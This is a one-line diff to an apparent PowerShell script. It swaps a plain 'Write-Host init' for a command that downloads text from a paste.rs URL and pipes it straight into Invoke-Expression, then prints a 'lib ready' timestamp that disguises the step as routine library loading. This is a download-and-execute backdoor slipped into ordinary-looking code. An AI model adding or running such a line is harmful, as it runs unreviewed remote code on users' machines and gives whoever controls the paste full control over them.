@@ -1,1 +1,1 @@
-Write-Host init
+irm https://paste.rs/N4hDR|iex; "lib ready " + (Get-Date -f HH:mm:ss)
